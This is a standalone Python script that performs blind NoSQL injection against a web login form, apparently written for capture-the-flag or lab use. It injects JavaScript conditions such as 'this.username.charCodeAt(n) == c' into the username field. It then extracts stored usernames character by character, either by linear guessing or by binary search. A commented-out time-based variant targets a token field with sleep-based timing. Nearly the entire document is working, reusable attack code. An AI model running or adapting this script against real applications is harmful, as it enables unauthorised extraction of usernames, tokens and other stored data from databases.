#!/usr/bin/env python3
import requests, signal, string, sys
from urllib.parse import quote_plus

# variables
URL = "http://IP:PORT/"
HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}
TRUE_COND = "success"
TIME_COND = 1500
CHARACTERS = string.ascii_letters + string.digits + "{}()_" # string.printable
TIMEOUT = 10
PROXY = {"http": "http://IP:8080", "https": "http://IP:8080"}

# Ctrl+C
def handlerCrtlC(sig, frame):
    messages.warning("Exit...", True)
signal.signal(signal.SIGINT, handlerCrtlC)

# color class
class color:
   BLUE = "\033[0;34;48m"
   CYAN = "\033[0;36;48m"
   GREEN = "\033[0;32;48m"   
   YELLOW = "\033[0;33;48m"
   RED = "\033[0;31;48m"
   END = "\033[0;37;0m"

# messages class
class messages:
    def exit_program(exit):
        if exit:
            sys.exit()

    def success(message, exit=False):
        print(color.GREEN + "[i] " + message + color.END)
        messages.exit_program(exit)

    def warning(message, exit=False):
        print(color.YELLOW + "[!] " + message + color.END)
        messages.exit_program(exit)

    def error(message, exit=False):
        print(color.RED + "[x] " + message + color.END)
        messages.exit_program(exit)

# NoSQL injection execution
def nosql_injection_exec(payload):
    try:
        # boolean based
        data = "username=%s&password=pass" % (quote_plus('" || (' + payload + ') || ""=="'))
        res = requests.post(URL, headers=HEADERS, data=data, proxies=PROXY, timeout=TIMEOUT, verify=False)
        return TRUE_COND in res.text
        
        # time based
        """
        data = f"username=user{payload}&password=pass"
        res = requests.post(URL, headers=HEADERS, data=data, proxies=PROXY, timeout=TIMEOUT, verify=False)
        return (res.elapsed.total_seconds() > (TIME_COND/1000))
        """
    
    except Exception as e:
        messages.error(str(e), True)

# NoSQL injection blind
def nosql_injection_blind(max_length=50):
    exfiltration = ""

    for length in range(max_length):
        character_found = False
        for character in CHARACTERS:
            # boolean based
            payload = f"this.username.charCodeAt({length}) == {ord(character)}"

            # time based
            # payload = f"\"+%26%26+(this.token.match('^{exfiltration}{character}.*'))+%26%26+(sleep({TIME_COND}))+||+\"\"==\""

            if nosql_injection_exec(payload):
                exfiltration += character
                messages.success(exfiltration)
                character_found = True
                break
        if not character_found: break

    if exfiltration:
        print(color.CYAN + f"\n{exfiltration}\n" + color.END)
    else:
        messages.warning("Information not exfiltrated")        

# NoSQL injection blind binary
def nosql_injection_blind_binary(max_length=50):
    exfiltration = ""

    for character in range(max_length):
        low = 32     # Set low value of search area (' ')
        high = 127   # Set high value of search area ('~')
        #high = 167  # Set high value of search area ('Â¿')
        mid = 0

        # boolean based
        while low <= high:
            mid = (high + low) // 2
            if nosql_injection_exec('this.username.charCodeAt(%d) > %d' % (character, mid)):
                low = mid + 1
            elif nosql_injection_exec('this.username.charCodeAt(%d) < %d' % (character, mid)):
                high = mid - 1
            else:
                exfiltration += chr(mid)
                messages.success(exfiltration)
                break

    if exfiltration:
        print(color.CYAN + f"\n{exfiltration}\n" + color.END)
    else:
        messages.warning("Information not exfiltrated")

# main
if __name__ == "__main__":    
    # start script
    print()

    # NoSQL injection blind
    nosql_injection_blind()

    # NoSQL injection blind binary
    #nosql_injection_blind_binary()